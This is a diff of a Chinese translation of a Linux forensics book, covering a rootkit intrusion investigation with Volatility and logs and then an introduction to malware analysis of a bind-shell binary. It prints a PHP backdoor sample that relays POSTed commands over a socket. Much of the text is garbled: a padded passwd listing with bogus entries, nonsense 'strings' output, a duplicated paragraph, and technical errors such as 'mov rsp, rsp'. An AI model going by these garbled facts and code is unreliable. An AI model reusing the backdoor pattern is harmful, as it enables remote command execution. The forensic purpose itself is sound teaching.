-针对 PAS 目标系统的可疑进程运行 Volatility linux_psenv 命令的部分结果。
+针对 PAS 目标系统的可疑进程运行 Volatility `linux_psenv` 命令的部分结果。
 
-针对 PAS 目标系统运行了整套 Volatility `linux_check_xxxx` 命令。只有 `linux_check_syscall` 命令返回了结果。其中部分结果如图 9.16 所示。从结果可以看出，Xing Yi Quan 挂钩了 open、lstat、dup、kill、getdents、chdir、rename、rmdir 和 unlink 的 64 位系统调用。当查看该命令的完整输出结果时，被挂钩的系统调用的地址与未修改的调用处理程序明显不同。
+针对 PAS 目标系统运行了整套 Volatility `linux_check_xxxx` 命令。只有 `linux_check_syscall` 命令返回了结果。其中部分结果如图 9.16 所示。从结果可以看出，Xing Yi Quan 挂钩了 `open`、`lstat`、`dup`、`kill`、`getdents`、`chdir`、`rename`、`rmdir` 和 `unlink` 的 64 位系统调用。当查看该命令的完整输出结果时，被挂钩的系统调用的地址与未修改的调用处理程序明显不同。
 
 ### 图 9.16
 
-针对 PAS 目标系统运行了 Volatility `linux_enumerate_files` 命令并将结果保存到文件中。随后对该文件使用 Egrep 来定位文件系统缓存中的某些文件。图 9.17 所示的部分结果显示，`rocky.txt` 密码列表和 Yi Qian rootkit 都存储在隐藏目录 `/usr/local/mysql/hacked` 中。
+针对 PAS 目标系统运行了 Volatility `linux_enumerate_files` 命令并将结果保存到文件中。随后对该文件使用 `Egrep` 来定位文件系统缓存中的某些文件。图 9.17 所示的部分结果显示，`rocky.txt` 密码列表和 Yi Qian rootkit 都存储在隐藏目录 `/usr/local/mysql/hacked` 中。
 
 ```
 root:x:0:0:root:/root:/bin/bash
+
 root:x:0:0:root:/root:/bin/bash
+
 demon:x:1:1:daemon:/dev:/usr/sbin/nologin
+
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
+
 sync:x:4:4:sync:/dev:/usr/sbin/nologin
+
 man:x:5:5:man:/var/cache:/usr/sbin/nologin
+
 lpp:x:6:6:lpp:/var/spool/lpp:/usr/sbin/nologin
+
 uuc:x:7:7:uuc:/var/uuc:/bin/sync
+
 games:x:8:8:games:/var/games:/usr/sbin/nologin
+
 news:x:9:9:news:/var/news:/usr/sbin/nologin
+
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
 list:x:38:38:list:/var/run/nlist:/usr/sbin/nologin
+
 irc:x:39:39:irc:/var/run/ircd:/usr/sbin/nologin
+
 gnp:x:40:40:gnp:/var/lib/gnp:/usr/sbin/nologin
+
 backup:x:41:41:backup:/var/backups:/usr/sbin/nologin
+
 d:x:42:42:d:/:/bin/false
+
 proxy:x:43:43:proxy:/root:/usr/sbin/nologin
+
 4d:x:44:44:4d:/var/4d:/usr/sbin/nologin
+
 irc:x:45:45:irc:/var/irc:/usr/sbin/nologin
+
 nats:x:46:46:nats:/var/lib/nats:/usr/sbin/nologin
+
 inody:x:47:47:nobody:/var/existent:/usr/sbin/nologin
+
 list:x:48:48:list:/var/run/nlist:/usr/sbin/nologin
+
 irc:x:49:49:irc:/var/run/ircd:/usr/sbin/nologin
+
 ggp:x:50:50:gnp:/var/lib/gnp:/usr/sbin/nologin
+
 backup:x:51:51:backup:/var/backups:/usr/sbin/nologin
+
 d:x:52:52:d:/:/bin/false
+
 proxy:x:53:53:proxy:/root:/usr/sbin/nologin
+
 4d:x:54:54:4d:/var/4d:/usr/sbin/nologin
+
 irc:x:55:55:irc:/var/irc:/usr/sbin/nologin
+
 nats:x:56:56:nats:/var/lib/nats:/usr/sbin/nologin
+
 inody:x:57:57:nobody:/var/existent:/usr/sbin/nologin
+
 list:x:58:58:list:/var/run/nlist:/usr/sbin/nologin
+
 irc:x:59:59:irc:/var/run/ircd:/usr/sbin/nologin
+
 ggnp:x:60:60:gnp:/var/lib/gnp:/usr/sbin/nologin
+
 backup:x:61:61:backup:/var/backups:/usr/sbin/nologin
+
 d:x:62:62:d:/:/bin/false
+
 proxy:x:63:63:proxy:/root:/usr/sbin/nologin
+
 4d:x:64:64:4d:/var/4d:/usr/sbin/nologin
+
 irc:x:65:65:irc:/var/irc:/usr/sbin/nologin
+
 nats:x:66:66:nats:/var/lib/nats:/usr/sbin/nologin
+
 inody:x:67:67:nobody:/var/existent:/usr/sbin/nologin
+
 list:x:68:68:list:/var/run/nlist:/usr/sbin/nologin
+
 irc:x:69:69:irc:/var/run/ircd:/usr/sbin/nologin
+
 ggnp:x:70:70:gnp:/var/lib/gnp:/usr/sbin/nologin
+
 backup:x:71:71:backup:/var/backups:/usr/sbin/nologin
+
 d:x:72:72:d:/:/bin/false
+
 proxy:x:73:73:proxy:/root:/usr/sbin/nologin
+
 4d:x:74:74:4d:/var/4d:/usr/sbin/nologin
+
 irc:x:75:75:irc:/var/irc:/usr/sbin/nologin
+
 nats:x:76:76:nats:/var/lib/nats:/usr/sbin/nologin
+
 inody:x:77:77:nobody:/var/existent:/usr/sbin/nologin
+
 list:x:78:78:list:/var/run/nlist:/usr/sbin/nologin
+
 irc:x:79:79:irc:/var/run/ircd:/usr/sbin/nologin
+
 ggnp:x:80:80:gnp:/var/lib/gnp:/usr/sbin/nologin
+
 backup:x:81:81:backup:/var/backups:/usr/sbin/nologin
+
 d:x:82:82:d:/:/bin/false
+
 proxy:x:83:83:proxy:/root:/usr/sbin/nologin
+
 4d:x:84:84:4d:/var/4d:/usr/sbin/nologin
+
 irc:x:85:85:irc:/var/irc:/usr/sbin/nologin
+
 nats:x:86:86:nats:/var/lib/nats:/usr/sbin/nologin
+
 inody:x:87:87:nobody:/var/existent:/usr/sbin/nologin
+
 list:x:88:88:list:/var/run/nlist:/usr/sbin/nologin
+
 irc:x:89:89:irc:/var/run/ircd:/usr/sbin/nologin
+
 ggnp:x:90:90:gnp:/var/lib/gnp:/usr/sbin/nologin
-backup:x:91:91:backup:/var/backups:/usr/sbin/nologin
 ```
+
+
+
+`backup:x:91:91:backup:/var/backups:/usr/sbin/nologin`
 
 ### 图 9.17
 
@@ -7173,7 +8468,7 @@ backup:x:91:91:backup:/var/backups:/usr/sbin/nologin
 
 此时，根据哈希值，我们知道至少在 5 月 4 日左右安装了恶意软件。我们还知道创建了一个具有管理员权限的新用户，攻击者尝试破解系统上的额外密码。我们还不知道初始入侵发生的何时地。
 
-使用我们在第 5 章中的 Python 脚本，磁盘镜像可以轻松地挂载到取证工作站。完成后，在 `passwd` 文件上运行 `grep 1001` 可以发现用户 ID 1001（用于启动一个 root shell）属于 michael 用户，其真实名为 Michael Keaton。
+使用我们在第 5 章中的 Python 脚本，磁盘镜像可以轻松地挂载到取证工作站。完成后，在 `passwd` 文件上运行 `grep 1001` 可以发现用户 ID `1001`（用于启动一个 root shell）属于 `michael` 用户，其真实名为 Michael Keaton。
 
 由于系统正在运行 Web 服务器，并且安装了 Weebly PHP 后门，因此查看 Web 服务器日志以获取有关入侵如何发生的见解是有意义的。此时我们还不知道入侵是否是由网站问题引起的，但绝对值得检查。
 
@@ -7197,18 +8492,27 @@ Apache Web 服务器日志可以在 `/var/log/apache2` 中找到。两个主日�
 
 安装 SSH 后门的证据。
 
-
 ```php
 <?php
+
 $a=base64_decode('c29ja2V0X3N0cm99X');
+
 $b=base64_decode('c3Bjb2Q=');
+
 $c=base64_decode('jbWuL3Q=');
+
 $u='hacked';
+
 $h='127.0.0.1';
+
 $p=22;
+
 $s=@socket_create($a,base64_decode('RF3Q='),$c));
+
 @socket_connect($s,$h,$p);
+
 fwrite($s,$_POST['cmd']);
+
 fclose($s);?>
 ```
 
@@ -7238,7 +8542,7 @@ fclose($s);?>
 
 失败登录尝试。失败尝试反复发生直到 23:07:54。参考信息图 9.24 表明密码已泄露。
 
-虽然 .bash_history 文件中的 bash 历史没有像 Volatility 的历史那样带有时间戳，但它仍然提供有用信息。如图 9.26 所示，John 的账户被用于下载并安装两个我们尚未发现的 rootkit。第一个名为 Poison 的 Web Shell，安装在 Web 服务器上并名为 index2.php。第二个称为 RK。
+虽然 `.bash_history` 文件中的 bash 历史没有像 Volatility 的历史那样带有时间戳，但它仍然提供有用信息。如图 9.26 所示，John 的账户被用于下载并安装两个我们尚未发现的 rootkit。第一个名为 Poison 的 Web Shell，安装在 Web 服务器上并名为 `index2.php`。第二个称为 RK。
 
 ```bash
 $ /usr/bin/bash $ cd /etc/query
@@ -7258,13 +8562,15 @@ $ /home/john/bash $ ./rk
 ```
 
 ### 图 9.26
+
 安装两个额外 rootkit 的证据。
 
-文档根目录下的 PHP 文件列表以及 index2.php 文件的开头如图 9.27 所示。index2.php 声称是 Doddy Hackman 编写的 Poison Shell 1.0。注意 index2.php 的时间戳是 2013 年，与目前发现的某些未修改时间戳的恶意软件不同。
+文档根目录下的 PHP 文件列表以及 `index2.php` 文件的开头如图 9.27 所示。`index2.php` 声称是 Doddy Hackman 编写的 Poison Shell 1.0。注意 `index2.php` 的时间戳是 2013 年，与目前发现的某些未修改时间戳的恶意软件不同。
 
 ![](img/7abfab28a493757db3f096946a95ec01_350_0.png)
 
 ### 图 9.27
+
 Poison Shell 1.0 已安装在目标系统的证据。我们看到一个名为 ".rk" 的隐藏目录，用于存储 RK rootkit。由于我们挂载了目标文件系统，我们可以使用命令 `find -type d -name ".*"` 来定位所有隐藏目录。在目标系统运行该命令的结果如图 9.28 所示。注意 ".rk" 目录未列出。该目录可能在之后被删除了。此外，没有发现新的可疑目录。
 
 ```
@@ -7290,6 +8596,8 @@ Poison Shell 1.0 已安装在目标系统的证据。我们看到一个名为 ".
 /usr/local/sbin
 ```
 
+
+
 ![](img/7abfab28a493757db3f096946a95ec01_351_0.png)
 
 图 9.28
@@ -7297,88 +8605,171 @@ Poison Shell 1.0 已安装在目标系统的证据。我们看到一个名为 ".
 
 ### 杂项发现
 
-在 /sbin 目录运行 out-of-sequence-inodes.sh 没有任何结果。在我们的第一个案例中，在 /bin 目录运行此脚本可以很容易看到 rootkit。该命令的输出输出如图 9.29 所示。
+在 `/sbin` 目录运行 `out-of-sequence-inodes.sh` 没有任何结果。在我们的第一个案例中，在 `/bin` 目录运行此脚本可以很容易看到 rootkit。该命令的输出输出如图 9.29 所示。
 
 ```
 20477 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20478 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20479 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20480 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20481 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20482 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20483 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20484 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20485 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20486 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20487 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20488 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20489 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20490 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20491 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20492 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20493 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20494 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20495 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20496 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20497 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20498 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20499 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20500 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20501 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20502 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20503 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20504 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20505 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20506 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20507 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20508 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20509 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20510 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20511 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20512 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20513 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20514 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20515 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20516 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20517 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20518 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20519 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20520 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20521 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20522 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20523 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20524 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20525 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20526 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20527 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20528 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20529 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20530 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20531 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20532 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20533 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20534 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20535 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20536 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20537 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20538 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20539 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20540 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20541 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20542 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20543 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20544 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20545 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20546 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20547 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20548 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20549 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20550 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20551 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20552 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20553 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20554 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+
 20555 drwxr-xr-x 2 root root 4096 Jan 15 22:00
+```
+
+
+
+```
 20556 drwxr-xr-x 2 root root 4096 Jan 15 22:00
 20557 drwxr-xr-x 2 root root 4096 Jan 15 22:00
 20558 drwxr-xr-x 2 root root 4096 Jan 15 22:00
@@ -7405,8 +8796,6 @@ Poison Shell 1.0 已安装在目标系统的证据。我们看到一个名为 ".
 20579 drwxr-xr-x 2 root root 4096 Jan 15 22:00
 20580 drwxr-xr-x 2 root root 4096 Jan 15 22:00
 ```
-
-
 
 
 
@@ -7447,7 +8836,7 @@ Poison Shell 1.0 已安装在目标系统的证据。我们看到一个名为 ".
 
 在本章中，我们分析了一次比本书之前讨论的 PFE 攻击稍复杂的攻击。我们发现，无论攻击者的复杂程度如何，都可以采用相同的技术。要获取攻击者行为的全景，需要使用实时分析、内存分析和文件系统分析。我们能够研究已安装的恶意软件以发现其功能。在下一章中，我们将讨论如何分析未知执行文件。我们的对话将包括判断未知文件是否真的是恶意软件。
 
-### 第 10 章
+## 第 10 章
 
 ### 恶意软件
 
@@ -7462,7 +8851,7 @@ Poison Shell 1.0 已安装在目标系统的证据。我们看到一个名为 ".
 - 使用 `objdump` 进行反汇编
 - 使用 `strace` 跟踪系统调用
 - 使用 `ltrace` 跟踪库调用
-- 使用 GNU 调试器 (gdb)
+- 使用 GNU 调试器 (`gdb`)
 - 混淆技术
 
 ### 是恶意软件吗？
@@ -7486,9 +8875,6 @@ Poison Shell 1.0 已安装在目标系统的证据。我们看到一个名为 ".
 二进制文件提供的信息具体得多。在这里我们看到二进制文件是 64 位可执行链接格式 (ELF) 文件，适用于小端序系统（Linux 就是这样的系统）。它们也是动态链接的，这意味着它们使用共享库，而不是将所有需要的代码静态链接到执行文件中（这会使文件巨大）。该文件兼容内核 2.6.24 及版本。文件未剥离调试信息。每个二进制标识符还给出了安全哈希算法 (SHA) 哈希值。
 
 ### 是已知的文件吗？
-
-
-
 
 许多机构维护着已知恶意软件的 MD5 和 SHA 哈希值数据库。自然地，这些哈希值大部分属于“恶意软件之王”Windows，但许多数据库也列出了 Linux 恶意软件。其中一些数据库需要下载，另一些则可以在线访问。可以通过多个服务访问的在线数据库之一是由 Team Cymru 维护的 [恶意软件哈希注册表 (MHR)](http://team-cymru.org/MHR.html)。
 
@@ -7522,22 +8908,7 @@ NSRL 参考数据集 (RDS) 中已知 Linux 二进制文件的条目。
 
 在大多数情况下，你的文件不会列在 MHR 或 NSRL 中。如果你有大量可疑文件，这些数据库最适合用于缩小待检查文件的范围。`strings` 工具会搜索二进制文件中的 ASCII 文本并显示其找到的内容。该命令的语法为 `strings -a <suspicious file>`。运行命令 `strings -a xingyi_bindshell` 的部分结果如图 10.5 所示。图中高亮了临时文件的路径和可能可能是密码的内容。
 
-```
-ls -l start act
-top 7.2
-dump 2.2.7
-l
-page
-grep reverse
-awk reward
-var second
-rot name
-cat -v to file |n YOUR file portion
-man -s part class. with F section
-listed to test --exclude!
-find file
-sed -py -name/
-```
+
 
 ### 图 10.5
 对可疑二进制文件运行 `strings`。
@@ -7560,6 +8931,8 @@ listed to test --exclude!
 find file
 sed -py -name/
 ```
+
+
 
 ![](img/7abfab28a493757db3f096946a95ec01_360_0.png)
 
@@ -7595,7 +8968,7 @@ sed -py -name/
 
 之前的大部分章节都带有一个前提，即二进制文件已剥离。剥离二进制文件是常见的做法，原因有两个：首先，移除符号可以显著缩小执行文件的体积。其次，剥离文件使得逆向工程变得困难。如果使用了共享库（几乎总是如此），那么程序必须能够找到它们。
 
-`ldd` 的语法简单为 `ldd <binary>`。针对 `xingyi_bindshell` 及其剥离副本运行 `ldd` 的结果如图 10.8 所示。注意结果是相同的。`file` 命令也运行在了其中一个共享库 libc-2.19.so 上。该库有两个版本，带有调试符号，另一个没有。
+`ldd` 的语法简单为 `ldd <binary>`。针对 `xingyi_bindshell` 及其剥离副本运行 `ldd` 的结果如图 10.8 所示。注意结果是相同的。`file` 命令也运行在了其中一个共享库 `libc-2.19.so` 上。该库有两个版本，带有调试符号，另一个没有。
 
 图 10.7
 
@@ -7608,11 +8981,7 @@ img/7abfab28a493757db3f096946a95ec01_362_0.png)
 
 ### 使用 readelf 获取概览
 
-Linux 可执行文件采用可执行和链接格式 (ELF)。ELF 文件是一个对象文件，根据你尝试对它做什么，可以以两种不同的方式查看。图 10.9 显示了这两种视图以及与每种视图相关的文件部分。
-
-
-
-
+Linux 可执行文件采用可执行和链接格式 `ELF`。ELF 文件是一个对象文件，根据你尝试对它做什么，可以以两种不同的方式查看。图 10.9 显示了这两种视图以及与每种视图相关的文件部分。
 
 ### 链接视图
 
@@ -7629,13 +8998,13 @@ Linux 可执行文件采用可执行和链接格式 (ELF)。ELF 文件是一个�
 
 ELF 文件的两种视图。
 
-如图 10.9 所示，所有 ELF 文件都有一个头部。当文件被执行时，会读取紧随后的程序头部表（PHT）。PHT 描述了文件中的各种段（大数据块）。在链接视图中，会忽略 PHT，并读取文件末尾的节头部表（SHT）。SHT 描述了文件中的各种节（段的子部分）。
+如图 10.9 所示，所有 ELF 文件都有一个头部。当文件被执行时，会读取紧随后的程序头部表 `PHT`。PHT 描述了文件中的各种段（大数据块）。在链接视图中，会忽略 PHT，并读取文件末尾的节头部表 `SHT`。SHT 描述了文件中的各种节（段的子部分）。
 
-`readelf` 工具用于解析 ELF 文件的不同部分。得益于这个实用的程序，几乎不需要深究 ELF 结构的细节。命令 `readelf --file-header <file>` 将显示头部信息。对 `xingyi_bindshell` 运行此命令的结果如图 10.10 所示。从图中可以看出，这是一个 64 位可执行文件，具有 9 个程序头部和 30 个节头部。所有 ELF 文件都以“幻数字”0x7F开头，随后是字符串“ELF”，或者十六进制表示的 0x7F 0x45 0x4C 0x46。
+`readelf` 工具用于解析 ELF 文件的不同部分。得益于这个实用的程序，几乎不需要深究 ELF 结构的细节。命令 `readelf --file-header <file>` 将显示头部信息。对 `xingyi_bindshell` 运行此命令的结果如图 10.10 所示。从图中可以看出，这是一个 64 位可执行文件，具有 9 个程序头部和 30 个节头部。所有 ELF 文件都以“幻数字”`0x7F`开头，随后是字符串“ELF”，或者十六进制表示的 `0x7F 0x45 0x4C 0x46`。
 
 图 10.10
 
-`readelf --section-headers <file>` 命令用于显示节信息。运行 `readelf --section-headers -W xingyi_bindshell` 的输出如图 10.11 所示。-W 选项指定宽格式（不限制为 80 字符宽）。节在表 10.2 中描述。该文件中的节相当典型。
+`readelf --section-headers <file>` 命令用于显示节信息。运行 `readelf --section-headers -W xingyi_bindshell` 的输出如图 10.11 所示。`-W` 选项指定宽格式（不限制为 80 字符宽）。节在表 10.2 中描述。该文件中的节相当典型。
 
 ![](img/7abfab28a493757db3f096946a95ec01_365_0.png)
 
@@ -7678,9 +9047,9 @@ ELF 文件的两种视图。
 | .symtab | 符号表 |
 | .srttab | 符号表条目名称 |
 
-如果你不理解 10.2 表描述的所有节，不必过度担心。我认为大多数专业程序员 也不了解所有这些内容。对于我们的目的来说，最重要的的是 `.text`、`.data` 和 `.bss`，它们分别包含程序代码、初始化数据和未初始化数据。我们的文件包含所有这些节，表明该程序是用 C 或类似语言编写的，并使用 GCC（GNU 编译器集合）编译的。在理论上，这应该比手工编写的汇编代码更容易进行逆向。
+如果你不理解 10.2 表描述的所有节，不必过度担心。我认为大多数专业程序员 也不了解所有这些内容。对于我们的目的来说，最重要的的是 `.text`、`.data` 和 `.bss`，它们分别包含程序代码、初始化数据和未初始化数据。我们的文件包含所有这些节，表明该程序是用 C 或类似语言编写的，并使用 `GCC`（GNU 编译器集合）编译的。在理论上，这应该比手工编写的汇编代码更容易进行逆向。
 
-命令 `readelf --program-headers <file>` 用于解析程序头部表（PHT）。在 `xingyi_bindshell` 上运行此命令的结果如图 10.12 所示。如图所示，大多数段由节列表组成。值得注意的例外是段 00 和 07，它们分别包含程序头部表和栈。这些每个段的描述可以在表 10.3 中找到。PHT 还规定了每个段应该加载的位置以及它所需的字节对齐。
+命令 `readelf --program-headers <file>` 用于解析程序头部表 `PHT`。在 `xingyi_bindshell` 上运行此命令的结果如图 10.12 所示。如图所示，大多数段由节列表组成。值得注意的例外是段 00 和 07，它们分别包含程序头部表和栈。这些每个段的描述可以在表 10.3 中找到。PHT 还规定了每个段应该加载的位置以及它所需的字节对齐。
 
 图 10.12
 
@@ -7698,51 +9067,45 @@ ELF 文件的两种视图。
 | 07 – STACK | 栈 |
 | 08 – RELRO | 只读段 |
 
-如果你不理解 10.2 表描述的所有节，不必过度担心。我认为大多数专业程序员 也不了解所有这些内容。对于我们的目的来说，最重要的的是 `.text`、`.data` 和 `.bss`，它们分别包含程序代码、初始化数据和未初始化数据。我们的文件包含所有这些节，表明该程序是用 C 或类似语言编写的，并使用 GCC（GNU 编译器集合）编译的。在理论上，这应该比手工编写的汇编代码更容易进行逆向。
+如果你不理解 10.2 表描述的所有节，不必过度担心。我认为大多数专业程序员 也不了解所有这些内容。对于我们的目的来说，最重要的的是 `.text`、`.data` 和 `.bss`，它们分别包含程序代码、初始化数据和未初始化数据。我们的文件包含所有这些节，表明该程序是用 C 或类似语言编写的，并使用 `GCC`（GNU 编译器集合）编译的。在理论上，这应该比手工编写的汇编代码更容易进行逆向。
 
+这些寄存器中的一些特殊用途，其余用于执行计算或向函数传递变量。某些寄存器自早期的 16 位处理器（`8086`, `8028`）以来就已经存在，另一些是在发布 32 位处理器（`80386`）时添加的，而还有一些是在 AMD 发布第一 64 位处理器时添加的。标准的 64 位处理器寄存器如图 10.16 所示。旧寄存器根据宽度命名。XX、EXE 和 RXX 分别表示 16 位、32 位和 64 位宽。某些位宽可以进一步划分为 XH 和 XL，分别表示高字节和低字节。以 `RAX` 寄存器为例，`AL`、`EAX` 和 `RAX` 分别代表寄存器的最低两个字节、四个字节和所有八个字节。在查看汇编代码时，你通常会根据需要看到不同的寄存器。
 
+`RIP` 寄存器（或 32 位汇编中的 `EIP`）被称为指令指针。它指向内存中可以找到要运行的下一条指令的地址。`FLAGS` 寄存器用于跟踪比较状态，例如数学运算是否产生了进位。`RBP` 寄存器被称为基指针，它指向当前栈帧的基部（底部）。`RSP` 寄存器称为栈指针，它指向当前栈帧的顶部。那么，什么是栈？
 
-
-这些寄存器中的一些特殊用途，其余用于执行计算或向函数传递变量。某些寄存器自早期的 16 位处理器（8086, 8028）以来就已经存在，另一些是在发布 32 位处理器（80386）时添加的，而还有一些是在 AMD 发布第一 64 位处理器时添加的。标准的 64 位处理器寄存器如图 10.16 所示。旧寄存器根据宽度命名。XX、EXE 和 RXX 分别表示 16 位、32 位和 64 位宽。某些位宽可以进一步划分为 XH 和 XL，分别表示高字节和低字节。以 RAX 寄存器为例，AL、EAX 和 RAX 分别代表寄存器的最低两个字节、四个字节和所有八个字节。在查看汇编代码时，你通常会根据需要看到不同的寄存器。
-
-RIP 寄存器（或 32 位汇编中的 EIP）被称为指令指针。它指向内存中可以找到要运行的下一条指令的地址。FLAGS 寄存器用于跟踪比较状态，例如数学运算是否产生了进位。RBP 寄存器被称为基指针，它指向当前栈帧的基部（底部）。RSP 寄存器称为栈指针，它指向当前栈帧的顶部。那么，什么是栈？
-
-栈帧是栈中与程序当前运行的函数相关的部分。那么，栈到底是什么？栈是一个特殊的内存区域，每当通过汇编 CALL 指令调用新函数时，它就会增长，当函数完成时收缩。在 C 和类似的语言中，你会听到人们提到栈变量，这些变量在声明时自动创建，并在代码块结束时消失。这些变量分配在栈上。当你思考函数是什么时，它始终是某种类型的代码块。函数的局部变量通常分配在栈上。
+栈帧是栈中与程序当前运行的函数相关的部分。那么，栈到底是什么？栈是一个特殊的内存区域，每当通过汇编 `CALL` 指令调用新函数时，它就会增长，当函数完成时收缩。在 C 和类似的语言中，你会听到人们提到栈变量，这些变量在声明时自动创建，并在代码块结束时消失。这些变量分配在栈上。当你思考函数是什么时，它始终是某种类型的代码块。函数的局部变量通常分配在栈上。
 
 当需要更大的存储空间或变量的生命周期需要超过单个函数时，可以在堆上创建变量。获取堆空间的机制在不同编程语言之间存在。如果你查看操作系统创建堆并向各种进程分配内存的内部机制，实际上相当复杂。
 
-在为了寻找漏洞而对应用程序进行逆工程时，栈和堆在过程中起核心作用。对于我们的目的，只需要理解栈是函数存储局部变量最常见的地方即可。回看图 10.15，你会发现第一条指令 `push rbp` 用于保存当前的基指针（栈的底部）。使用 `mov rsp, rsp` 命令将当前栈指针移动到基指针（注意在英特尔表示中，目标在左侧，源在右侧）。在下一行，通过将 RBX 中存储的当前值推入栈来保存。下一行使用 `sub rsp, 0x88` 指令从栈指针减去 0x88。
+在为了寻找漏洞而对应用程序进行逆工程时，栈和堆在过程中起核心作用。对于我们的目的，只需要理解栈是函数存储局部变量最常见的地方即可。回看图 10.15，你会发现第一条指令 `push rbp` 用于保存当前的基指针（栈的底部）。使用 `mov rsp, rsp` 命令将当前栈指针移动到基指针（注意在英特尔表示中，目标在左侧，源在右侧）。在下一行，通过将 `RBX` 中存储的当前值推入栈来保存。下一行使用 `sub rsp, 0x88` 指令从栈指针减去 `0x88`。
 
 ![](img/7abfab28a493757db3f096946a95ec01_372_0.png)
 
 ### 图 10.15
 
-使用 objdump 反汇编 xingyi_bindshell 的部分结果。
+使用 `objdump` 反汇编 `xingyi_bindshell` 的部分结果。
 
-你可能会想：“等一下，栈，我为什么要通过减法来增长栈呢？”这是因为栈是向下增长的（从高内存地址到低内存地址）。通过将旧栈指针 (RSP) 移动到基指针 (RBP)，栈帧的顶部变成了新的底部。减去 0x88 为当前栈帧分配了 88 字节。该存储空间供当前函数使用。如果你查看图 10.15，你会看到几条 mov 指令将值移动到新分配的缓冲区中。所有这些移动的目标都是方括号中的内存地址，它们都在帧 [rbp-<some offset>] 中。
+你可能会想：“等一下，栈，我为什么要通过减法来增长栈呢？”这是因为栈是向下增长的（从高内存地址到低内存地址）。通过将旧栈指针 `RSP` 移动到基指针 `RBP`，栈帧的顶部变成了新的底部。减去 `0x88` 为当前栈帧分配了 88 字节。该存储空间供当前函数使用。如果你查看图 10.15，你会看到几条 `mov` 指令将值移动到新分配的缓冲区中。所有这些移动的目标都是方括号中的内存地址，它们都在帧 `[rbp-<some offset>]` 中。
 
